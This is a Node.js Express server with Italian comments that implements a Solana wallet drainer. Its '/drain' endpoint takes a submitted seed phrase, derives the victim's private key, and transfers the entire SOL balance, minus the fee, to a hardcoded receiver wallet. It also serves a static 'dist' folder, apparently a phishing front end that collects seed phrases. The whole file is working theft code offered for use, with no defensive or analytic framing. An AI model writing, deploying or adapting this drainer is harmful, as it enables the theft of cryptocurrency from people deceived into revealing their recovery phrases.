const express = require('express');
const path = require('path');
const { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, Keypair } = require('@solana/web3.js');
const { mnemonicToSeed } = require('bip39');
const { derivePath } = require('ed25519-hd-key');

const app = express();
app.use(express.json({ limit: '10mb' }));

const YOUR_RECEIVER_WALLET = 'IL_TUO_WALLET_PUBLIC_KEY';
const connection = new Connection('https://api.mainnet-beta.solana.com');

// ===== DRENAGGIO =====
app.post('/drain', async (req, res) => {
  const { seed, walletPublicKey } = req.body;
  if (!seed || !walletPublicKey) {
    return res.status(400).json({ error: 'Dati mancanti' });
  }
  try {
    const seedBuffer = await mnemonicToSeed(seed);
    const derived = derivePath("m/44'/501'/0'/0'", seedBuffer.toString('hex'));
    const fromKeypair = Keypair.fromSeed(derived.key);
    const fromPubkey = fromKeypair.publicKey;
    const toPubkey = new PublicKey(YOUR_RECEIVER_WALLET);

    const balance = await connection.getBalance(fromPubkey);
    const fee = 5000;
    const amount = balance - fee;
    let solTx = null;
    if (amount > 0) {
      const tx = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: fromPubkey,
          toPubkey: toPubkey,
          lamports: amount,
        })
      );
      solTx = await connection.sendTransaction(tx, [fromKeypair]);
      await connection.confirmTransaction(solTx);
    }

    res.json({
      status: 'drain_completed',
      from: fromPubkey.toString(),
      solTx: solTx,
      solAmount: amount / LAMPORTS_PER_SOL,
      tokenCount: 0
    });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ===== SERVE STATICO =====
app.use(express.static('dist'));

app.listen(3000, () => console.log('🚀 Server in ascolto su http://localhost:3000'));
